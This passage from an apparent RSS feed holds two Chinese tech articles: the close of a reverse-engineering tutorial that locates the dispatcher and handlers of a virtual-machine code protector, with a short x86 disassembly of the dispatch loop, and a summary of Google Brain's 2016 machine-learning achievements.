					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0076 seconds] --&gt;
&lt;p&gt;接着找Dispatch，刚才说过，它既是虚拟机指令的开始，又是结束，它得到的执行次数一定也最多。可以看到第三行的0x004010B9，这个地址在虚拟机入口地址之后，执行次数最多，同样的办法可以看到这段代码的终止位置是0x004010D9：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b0da9d4810610248700&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Assembly (x86)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
004010BC &amp;gt; /FF45 EC inc dword ptr [ebp-0x14]
004010BF . |8B45 EC mov eax, dword ptr [ebp-0x14]
004010C2 . |8A00 mov al, byte ptr [eax]
004010C4 . |8845 F0 mov byte ptr [ebp-0x10], al
004010C7 . |B8 00204000 mov eax, 00402000
004010CC . |0FB65D F0 movzx ebx, byte ptr [ebp-0x10]
004010D0 . |C1E3 02 shl ebx, 0x2
004010D3 . |03C3 add eax, ebx
004010D5 . |FF20 jmp dword ptr [eax]&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b0da9d4810610248700-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b0da9d4810610248700-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b0da9d4810610248700-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b0da9d4810610248700-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b0da9d4810610248700-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b0da9d4810610248700-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b0da9d4810610248700-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b0da9d4810610248700-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b0da9d4810610248700-9&quot;&gt;9&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b0da9d4810610248700-1&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;004010BC&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;FF&lt;/span&gt;45&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;EC&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;inc&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b0da9d4810610248700-2&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;004010BF&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;8B45&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;EC&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b0da9d4810610248700-3&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;004010C2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;8A00&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;al&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b0da9d4810610248700-4&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;004010C4&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;8845&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;F&lt;/span&gt;0&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;al&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b0da9d4810610248700-5&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;004010C7&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;B&lt;/span&gt;8&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;00204000&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;00402000&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b0da9d4810610248700-6&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;004010CC&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0FB65D&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;F&lt;/span&gt;0&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;movzx&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b0da9d4810610248700-7&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;004010D0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;C&lt;/span&gt;1&lt;span class=&quot;crayon-v &quot;&gt;E&lt;/span&gt;3&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;shl&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x2&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b0da9d4810610248700-8&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;004010D3&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;03C3&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;add&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebx&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b0da9d4810610248700-9&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;004010D5&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;FF&lt;/span&gt;20&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;jmp&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0030 seconds] --&gt;
&lt;p&gt;最后是找这次执行虚拟机用到的handle。这个不难，虚拟机入口地址之后的代码段除了init和dispatch，其它都是handle，所有执行过的handle都会在里面出现。当然了，某条handle的具体作用，以及没有执行过的handle，就只能靠人肉分析了。还有就是，就分析虚拟机保护来说，了解执行了哪些handle，以及哪些handle更常用，这些信息都是十分有用的。&lt;/p&gt;

        
        
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109803&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109803votetotal&quot;&gt;1&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109803&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt;  收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt;  评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;

&lt;div id=&quot;author-bio&quot;&gt;
	
	&lt;h3 class=&quot;widget-title&quot;&gt;
	关于作者：&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/woosheep&quot;&gt;木羊同学&lt;/a&gt;
	&lt;/h3&gt;
	&lt;div class=&quot;alignleft&quot;&gt;
		&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/woosheep&quot;&gt;
			&lt;img src=&quot;/images/jobbole.com/2823d23f035f91ee8954a7f90c2d957c.jpg&quot;&gt;
		&lt;/a&gt;
	&lt;/div&gt;

    &lt;div class=&quot;author-bio-info&quot;&gt;

        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            hackos.py        &lt;/span&gt;
        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            &lt;a href=&quot;http://www.jobbole.com/members/woosheep&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt; 个人主页&lt;/a&gt; ·
            &lt;a href=&quot;http://blog.jobbole.com/author/woosheep/&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-file-text-o&quot;&gt;&lt;/i&gt; 我的文章&lt;/a&gt;

             · &lt;a title=&quot;声望值&quot; target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/woosheep/reputation/&quot;&gt;&lt;i class=&quot;fa fa-graduation-cap&quot;&gt;&lt;/i&gt; 12&lt;/a&gt;        &lt;/span&gt;
    &lt;/div&gt;
	&lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Sat, 14 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-14-109803-153041876.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-14-109803-153041876.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>谷歌大脑 2016 年机器学习的 9 大进展</title>
        <description>


        			&lt;div class=&quot;textwidget&quot;&gt;
&lt;/div&gt;
		
		&lt;p&gt;多年来，Google Brain 团队致力于智能的机器学习来改善人们的生活。为此，无论是在纯理论研究的领域，还是将研究成果投入实际应用，探索从未停止。近期，Google Brain 团队负责人 Jeff Dean 对2016年在各领域取得的重大进展进行了总结。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;理论研究成果：发表 27 篇论文&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;2016 年，Google Brain 团队参与了 ICML、NIPS 和 ICLR 等国际顶级机器学习会议，并在这些会议上发表了 27 篇论文。除机器学习领域的专业会议以外，还有很多论文被其他领域的会议所接受，例如自然语言处理领域的 ACL 和 CoNNL 大会、语音领域的 ICASSP 大会等。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/b75dbd846c7adeb1a67ab713726441ed.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;Google Brain 还向深度学习研究会议 ICLR 2017 提交了 34 篇论文，以在即将到来的大会中进行研究讨论。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;自然语言理解：翻译精准度提升 85%&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;让计算机更好地理解人类语言，一直是 Google Brain 团队的一个研究重点。早在 2014 年，Google Brain 的三位研究员通过相关论文展示了神经网络技术被运用在机器翻译中的可能性，2015 年的研究还表明这种技术也能被运用到图像翻译、句子成分分析和解决集合运算问题等方面。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/25c70fe5c14393c47eefa3cec67d15da.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;在 2016 年，通过与 Google 翻译团队的紧密合作，一种端对端的学习系统被运用到了 Google 翻译中，大幅提高了翻译准确率，其中一些语言对的准确率甚至提高了 85%。随之发布的多语言互译系统，则使能够实现互译的语言对越来越多，向消除语言隔阂的目标又进了一步。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3 种方法提高机器人自主学习效率&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将新功能、新能力嵌入到原有机器人中，对于用算法精心设计并由人工进行编程的传统机器技术来说，是一个难点，而机器学习技术为这一难点提供了突破口。2016 年，Google Brain 与 Google X 团队合作，通过大量的实验、探索让机械臂在更短的时间里自主学习和训练“手眼协调”的方法。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/7a697b39386cadc50610c30a10495968.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;Google Brain 团队最终得出了让机器人获得新能力的 3 种方法：强化学习、交互学习和演示学习。团队仍将继续研究让机器人在更加复杂的现实环境中习得新技能的方法。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;协助疾病诊断&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;机器学习技术的应用在医疗领域展现的巨大潜力十分令人兴奋。Google Brain 团队在美国医疗学会学报（JAMA）上发表的论文证明了机器学习技术被运用在糖尿病视网膜病变诊断中的潜力，这将为缺少诊断和治疗条件地区的患者带来福音。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/8a8a20b10e3d3015917e86019d7bf0d1.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;Google Brain 相信，机器学习无论是从质量还是从效率的层面上，都能大幅提升患者的诊疗体验。2017 年，在这个领域的研究将会进一步加强。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;机器学习与艺术的激烈碰撞&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;2016 年启动的 Magenta 项目，探索了如何用机器学习系统来学习人类的创造力，寻求艺术与机器智能碰撞的火花。&lt;/p&gt;
&lt;p&gt;从音乐和图像的生成开始，到文字和 VR 的生成，Magenta 正在成为最先进的内容创造生成模型。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;确保人工智能安全性和公平性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;复杂而强大的人工智能系统将越来越多地参与到人们的生活中，其安全性和公平性必须得到严格保证。Google Brain 与斯坦福大学、伯克利和 OpenAI 等大学和机构合作，共同发表论文，论述了人工智能安全领域研究中应被重视的着力点。目前，确保机器训练数据的私密安全是研究重点。&lt;/p&gt;
&lt;p&gt;Google Brain 也在着手让人工智能系统进行复杂决策。在这一过程中，保证决策的公平性也是非常重要的。在一篇监督机器学习过程的公平性机制的论文中，Google Brain 论述了如何通过技术手段避免偏见和歧视的出现。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;开源项目 TensorFlow 广受欢迎&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;GitHub 上最受欢迎的机器学习项目 TensorFlow 吸引了超过 570 为贡献者的 10000 以上的提议。同时，TensorFlow 也被许多知名研究团队和企业所采纳，并被投入到了实际应用中：从寻找珍稀海牛，到帮助农夫拣选黄瓜，各种项目中都有它的身影。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/a84fc969856aa7ac59802a707d57682f.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;2016 年 11 月，TensorFlow 开源一周年，一篇关于 TensorFlow 计算机系统的论文在计算机系统研究会议 OSDI 上被提交，阐述了其大规模机器学习的原理。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;建立机器学习社区 推动教育和技术发展&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;为加速机器学习领域的发展，培养更多专业人才，Google Brain 也一直都在积极建立机器学习社区，以开展机器学习研究。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/207de3e31a35d6bfd4b5ad3a151155ca.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;Google Brain 通过开设免费的深度学习网络课程、建立可视化学习系统、在线问答、接待实习生等形式，来推动机器学习领域的教育和技术的发展。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;让机器学习遍布 Google&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在 Google 内部，机器学习的浪潮也在席卷着每一个角落。机器学习的专业知识和意识已经被有意识地渗透到了许多团队中，并被应用到了产品开发中。例如，Google Brain 团队为 Google 定制的加速器 ASIC 大幅提高了机器学习的效率和性能，并被应用到了神经网络机器翻译系统和 AlphaGo 与李世石的围棋对战当中。&lt;/p&gt;
&lt;p&gt;总而言之，2016 年对 Google Brain 团队、同事和合作伙伴来说，是相当令人兴奋的一年。期待 2017 年机器学习的研究会对世界产生更加深远的影响！&lt;/p&gt;

        
        
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109770&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109770votetotal&quot;&gt;2&lt;/h10&gt; 赞&lt;/span&gt;
